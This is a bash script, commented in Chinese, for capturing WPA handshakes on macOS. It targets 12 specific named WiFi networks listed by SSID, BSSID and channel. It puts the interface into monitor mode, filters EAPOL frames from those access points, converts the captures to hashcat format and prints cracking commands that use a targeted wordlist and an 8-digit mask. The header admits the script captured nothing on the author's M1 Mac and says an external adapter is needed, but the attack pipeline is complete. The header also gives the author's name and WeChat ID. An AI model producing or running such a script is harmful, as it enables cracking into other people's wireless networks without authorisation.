#!/bin/bash
# ============================================================
# ⚠️ 此脚本已验证不可用 ⚠️
#
# macOS 26.3 + Apple M1 BCM4378 实测结果:
#   tcpdump -I 可以将 en0 切到监控模式(link-type=IEEE802_11_RADIO)
#   但 Apple WiFi 驱动不向用户态交付任何802.11原始帧 → 抓0个包
#
# 原理上设计为:
#   tcpdump -I 进入监控模式，被动等待EAPOL帧
#   按频道轮询，每个频道停留N秒，循环覆盖所有目标
#
# 实际结论:
#   Apple 从 macOS Ventura 起逐步限制了内置WiFi的监控模式能力
#   BCM4378 驱动不支持向 libpcap 交付原始帧
#   需要外部USB WiFi适配器(RTL8812AU等)才能真正抓包
#
# 保留此脚本仅供参考，不要期望它能抓到握手包
#
# 作者：传康Kk (微信:1837620622)
# ============================================================

set -euo pipefail

# ============================================================
# 配置区（根据扫描结果定制）
# ============================================================
IFACE="en0"

# 每个频道停留时间（秒），越长越容易抓到，但覆盖面越窄
DWELL_TIME=30

# 总运行时间（秒），0=无限运行直到Ctrl+C
MAX_RUNTIME=0

# 目标WiFi列表：SSID|BSSID|频道
# 按信号强度排序，优先抓信号好的
TARGETS=(
    "CMCC-R5Ji|c0:e0:18:f9:41:18|5"
    "sxbctvnet-CE9730|00:26:ac:ce:97:30|1"
    "ChinaNet-aWKW|d4:fc:13:6c:52:9d|8"
    "dingding|34:f7:16:2a:db:3b|3"
    "CMCC-K6GQ|64:6e:60:10:89:ce|8"
    "404|02:1c:0a:bc:6e:1e|11"
    "CMCC-qSvF|a4:1b:34:1c:60:08|1"
    "601|b0:5d:16:78:d8:a0|1"
    "2403|94:ab:0a:6a:80:00|9"
    "TP-LINK_65E9|dc:fe:18:0d:65:e9|6"
    "HUAWEI-10EPH0|b4:f1:8c:0e:7e:58|1"
    "dingding-5G|34:f7:16:2a:db:3c|149"
)

# ============================================================
# 输出目录（脚本所在目录）
# ============================================================
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CAPTURE_DIR="${SCRIPT_DIR}/captures_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$CAPTURE_DIR"

# ============================================================
# 颜色输出
# ============================================================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# ============================================================
# 全局变量
# ============================================================
TCPDUMP_PID=0
ORIGINAL_SSID=""
START_TIME=$(date +%s)
TOTAL_EAPOL=0

# ============================================================
# 清理函数（Ctrl+C 或退出时执行）
# ============================================================
cleanup() {
    echo ""
    echo -e "${YELLOW}[*] 正在清理...${NC}"

    # 停止tcpdump
    if [ $TCPDUMP_PID -ne 0 ] && kill -0 $TCPDUMP_PID 2>/dev/null; then
        kill $TCPDUMP_PID 2>/dev/null || true
        wait $TCPDUMP_PID 2>/dev/null || true
    fi

    # 恢复WiFi接口（监控模式 → 正常模式）
    echo -e "${CYAN}[*] 恢复WiFi接口...${NC}"
    sudo networksetup -setairportpower "$IFACE" off 2>/dev/null || true
    sleep 1
    sudo networksetup -setairportpower "$IFACE" on 2>/dev/null || true
    sleep 2

    # 重连原始WiFi
    if [ -n "$ORIGINAL_SSID" ]; then
        echo -e "${CYAN}[*] 重连原WiFi: ${ORIGINAL_SSID}${NC}"
        networksetup -setairportnetwork "$IFACE" "$ORIGINAL_SSID" 2>/dev/null || true
    fi

    # 合并所有抓包文件
    merge_and_convert

    echo -e "${GREEN}[✓] 清理完成${NC}"
    exit 0
}

trap cleanup INT TERM EXIT

# ============================================================
# 合并抓包文件并转换为hashcat格式
# ============================================================
merge_and_convert() {
    echo ""
    echo -e "${CYAN}════════════════════════════════════════${NC}"
    echo -e "${CYAN}  抓包结果处理${NC}"
    echo -e "${CYAN}════════════════════════════════════════${NC}"

    # 查找所有beacon和eapol文件
    local beacon_files=("$CAPTURE_DIR"/beacon_*.cap)
    local eapol_files=("$CAPTURE_DIR"/eapol_*.cap)

    # 检查是否有eapol文件
    local has_eapol=false
    for f in "${eapol_files[@]}"; do
        if [ -f "$f" ] && [ -s "$f" ]; then
            has_eapol=true
            break
        fi
    done

    if ! $has_eapol; then
        echo -e "${RED}[!] 未捕获到EAPOL帧（没有客户端连接/重连）${NC}"
        echo -e "${YELLOW}    提示: 晚高峰(18:00-23:00)重试，或等待更长时间${NC}"
        return
    fi

    # 合并所有cap文件
    local all_caps=()
    for f in "$CAPTURE_DIR"/*.cap; do
        [ -f "$f" ] && [ -s "$f" ] && all_caps+=("$f")
    done

    if [ ${#all_caps[@]} -eq 0 ]; then
        echo -e "${RED}[!] 无有效抓包文件${NC}"
        return
    fi

    local merged="$CAPTURE_DIR/merged_all.cap"
    echo -e "  合并 ${#all_caps[@]} 个文件..."
    mergecap -a -F pcap -w "$merged" "${all_caps[@]}" 2>/dev/null

    if [ ! -s "$merged" ]; then
        echo -e "${RED}[!] 合并文件为空${NC}"
        return
    fi

    # 用hcxpcapngtool转换为hashcat .22000格式
    local hashfile="$CAPTURE_DIR/handshakes.22000"
    echo -e "  转换为hashcat格式..."
    hcxpcapngtool -o "$hashfile" "$merged" 2>&1 | grep -E "EAPOL|PMKID|handshake|written" || true

    if [ -s "$hashfile" ]; then
        local count
        count=$(wc -l < "$hashfile" | tr -d ' ')
        echo ""
        echo -e "${GREEN}  ╔══════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}  ║  ✓ 成功提取 ${count} 条握手/PMKID哈希!       ║${NC}"
        echo -e "${GREEN}  ╚══════════════════════════════════════════╝${NC}"
        echo ""
        echo -e "  哈希文件: ${CYAN}${hashfile}${NC}"
        echo -e "  合并抓包: ${CYAN}${merged}${NC}"
        echo ""
        echo -e "${YELLOW}  下一步 → hashcat GPU破解:${NC}"
        echo -e "  hashcat -m 22000 ${hashfile} 针对性密码本/dict_ALL_TARGETS.txt"
        echo -e "  hashcat -m 22000 -a 3 ${hashfile} '?d?d?d?d?d?d?d?d'"
    else
        echo -e "${RED}[!] 未能提取有效的握手包/PMKID${NC}"
        echo -e "${YELLOW}    原始抓包已保存: ${merged}${NC}"
        echo -e "${YELLOW}    可用Wireshark手动检查EAPOL帧${NC}"
    fi
}

# ============================================================
# 提取唯一频道列表（去重+排序）
# ============================================================
get_unique_channels() {
    local channels=()
    for entry in "${TARGETS[@]}"; do
        local ch
        ch=$(echo "$entry" | cut -d'|' -f3)
        channels+=("$ch")
    done
    # 去重排序
    echo "${channels[@]}" | tr ' ' '\n' | sort -un | tr '\n' ' '
}

# ============================================================
# 构建指定频道的BSSID过滤器
# ============================================================
get_bssids_for_channel() {
    local target_ch=$1
    local bssids=()
    for entry in "${TARGETS[@]}"; do
        local ssid bssid ch
        ssid=$(echo "$entry" | cut -d'|' -f1)
        bssid=$(echo "$entry" | cut -d'|' -f2)
        ch=$(echo "$entry" | cut -d'|' -f3)
        if [ "$ch" = "$target_ch" ]; then
            bssids+=("$bssid")
        fi
    done
    echo "${bssids[@]}"
}

# ============================================================
# 在指定频道上捕获beacon+EAPOL
# ============================================================
capture_on_channel() {
    local ch=$1
    local duration=$2
    local bssids
    bssids=$(get_bssids_for_channel "$ch")

    if [ -z "$bssids" ]; then
        return
    fi

    # 显示该频道的目标
    local target_names=""
    for entry in "${TARGETS[@]}"; do
        local ssid ech
        ssid=$(echo "$entry" | cut -d'|' -f1)
        ech=$(echo "$entry" | cut -d'|' -f3)
        if [ "$ech" = "$ch" ]; then
            target_names="${target_names} ${ssid}"
        fi
    done

    echo -e "${CYAN}  [CH${ch}] 监听${duration}秒 →${target_names}${NC}"

    # 构建BPF过滤器：(beacon OR EAPOL) AND (bssid1 OR bssid2 OR ...)
    # beacon帧用于获取SSID信息
    # EAPOL帧(0x888e)包含握手/PMKID
    local bssid_filter=""
    for b in $bssids; do
        if [ -n "$bssid_filter" ]; then
            bssid_filter="${bssid_filter} or ether host ${b}"
        else
            bssid_filter="ether host ${b}"
        fi
    done

    local filter="(type mgt subtype beacon or ether proto 0x888e) and (${bssid_filter})"
    local capfile="$CAPTURE_DIR/ch${ch}_$(date +%H%M%S).cap"

    # 启动tcpdump后台捕获（-I=监控模式）
    sudo tcpdump -I -i "$IFACE" -w "$capfile" \
        --snapshot-length=65535 -U \
        "$filter" \
        2>/dev/null &
    TCPDUMP_PID=$!

    # 等待指定时间
    sleep "$duration"

    # 停止tcpdump
    if kill -0 $TCPDUMP_PID 2>/dev/null; then
        sudo kill $TCPDUMP_PID 2>/dev/null || true
        wait $TCPDUMP_PID 2>/dev/null || true
    fi
    TCPDUMP_PID=0

    # 检查捕获结果
    if [ -s "$capfile" ]; then
        local size
        size=$(wc -c < "$capfile" | tr -d ' ')
        if [ "$size" -gt 24 ]; then
            # 检查是否包含EAPOL帧
            local eapol_count
            eapol_count=$(tcpdump -r "$capfile" -c 100 'ether proto 0x888e' 2>/dev/null | wc -l | tr -d ' ')
            if [ "$eapol_count" -gt 0 ]; then
                TOTAL_EAPOL=$((TOTAL_EAPOL + eapol_count))
                echo -e "${GREEN}    ✓ 捕获 ${eapol_count} 个EAPOL帧! (总计: ${TOTAL_EAPOL})${NC}"
                # 重命名标记有EAPOL
                mv "$capfile" "${capfile%.cap}_eapol${eapol_count}.cap"
            else
                echo -e "    · beacon帧已记录 (${size}字节)"
                # 重命名为beacon文件
                mv "$capfile" "$CAPTURE_DIR/beacon_ch${ch}_$(date +%H%M%S).cap"
            fi
        else
            rm -f "$capfile"
        fi
    else
        rm -f "$capfile"
    fi
}

# ============================================================
# 主函数
# ============================================================
main() {
    # 检查root权限
    if [ "$(id -u)" -ne 0 ]; then
        echo -e "${YELLOW}[!] 需要sudo权限（tcpdump监控模式要求）${NC}"
        echo -e "${YELLOW}    请运行: sudo bash $0${NC}"
        # 尝试用sudo重新执行自己
        exec sudo bash "$0" "$@"
    fi

    echo ""
    echo -e "${GREEN}  ╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}  ║     macOS 被动握手包捕获工具 (tcpdump监控模式)          ║${NC}"
    echo -e "${GREEN}  ║                                                        ║${NC}"
    echo -e "${GREEN}  ║  原理: 监控模式下被动等待客户端连接/重连WiFi时         ║${NC}"
    echo -e "${GREEN}  ║        截获EAPOL四次握手帧 → 转换.22000 → hashcat     ║${NC}"
    echo -e "${GREEN}  ║                                                        ║${NC}"
    echo -e "${GREEN}  ║  限制: 单网卡同一时刻只能听一个频道                    ║${NC}"
    echo -e "${GREEN}  ║  策略: 多频道轮询, 每频道停留${DWELL_TIME}秒              ║${NC}"
    echo -e "${GREEN}  ║                                                        ║${NC}"
    echo -e "${GREEN}  ║  按 Ctrl+C 停止并自动合并/转换                        ║${NC}"
    echo -e "${GREEN}  ╚══════════════════════════════════════════════════════════╝${NC}"

    # 记录当前WiFi（稍后恢复用）
    ORIGINAL_SSID=$(networksetup -getairportnetwork "$IFACE" 2>/dev/null | sed 's/Current Wi-Fi Network: //' || echo "")
    if [ -n "$ORIGINAL_SSID" ] && [ "$ORIGINAL_SSID" != "You are not associated with an AirPort network." ]; then
        echo -e "\n  ${CYAN}当前WiFi: ${ORIGINAL_SSID}（完成后自动恢复）${NC}"
    else
        ORIGINAL_SSID=""
    fi

    # 显示目标列表
    echo ""
    echo -e "  ${YELLOW}目标WiFi (${#TARGETS[@]}个):${NC}"
    for entry in "${TARGETS[@]}"; do
        local ssid bssid ch
        ssid=$(echo "$entry" | cut -d'|' -f1)
        bssid=$(echo "$entry" | cut -d'|' -f2)
        ch=$(echo "$entry" | cut -d'|' -f3)
        printf "    %-24s %-18s CH%-3s\n" "$ssid" "$bssid" "$ch"
    done

    # 显示频道轮询计划
    local channels
    channels=$(get_unique_channels)
    echo ""
    echo -e "  ${YELLOW}频道轮询: ${channels}(每频道${DWELL_TIME}秒)${NC}"
    echo -e "  ${YELLOW}输出目录: ${CAPTURE_DIR}${NC}"
    echo ""

    # 断开当前WiFi（进入监控模式前必须）
    echo -e "${CYAN}[*] 断开WiFi连接（监控模式要求）...${NC}"
    networksetup -setairportpower "$IFACE" off 2>/dev/null || true
    sleep 1
    networksetup -setairportpower "$IFACE" on 2>/dev/null || true
    sleep 1

    # 主循环：频道轮询
    local round=0
    while true; do
        round=$((round + 1))
        echo ""
        echo -e "${YELLOW}━━ 第 ${round} 轮 (已捕获EAPOL: ${TOTAL_EAPOL}帧) ━━${NC}"

        for ch in $channels; do
            # 检查是否超时
            if [ $MAX_RUNTIME -gt 0 ]; then
                local elapsed=$(( $(date +%s) - START_TIME ))
                if [ $elapsed -ge $MAX_RUNTIME ]; then
                    echo -e "${YELLOW}[*] 达到最大运行时间 ${MAX_RUNTIME}秒${NC}"
                    return
                fi
            fi

            capture_on_channel "$ch" "$DWELL_TIME"
        done

        # 每轮结束显示统计
        local elapsed=$(( $(date +%s) - START_TIME ))
        local mins=$((elapsed / 60))
        local secs=$((elapsed % 60))
        echo -e "  ${CYAN}已运行: ${mins}分${secs}秒 | EAPOL帧: ${TOTAL_EAPOL}${NC}"
    done
}

main "$@"
